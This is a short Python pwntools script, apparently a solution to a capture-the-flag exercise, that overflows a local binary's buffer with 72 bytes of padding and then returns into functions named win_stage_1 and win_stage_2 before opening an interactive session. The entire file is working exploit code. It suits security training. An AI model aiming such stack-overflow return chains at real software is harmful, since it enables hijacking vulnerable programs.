from pwn import *

binary = args.BIN

e = context.binary = ELF(binary)
r = ROP(e)

p = process(e.path)

chain = cyclic(72) # overflow to RIP
chain += p64(e.sym['win_stage_1']) # first function want to call
chain += p64(e.sym['win_stage_2']) # first function want to call

p.sendlineafter(b'address).', chain)

p.interactive()
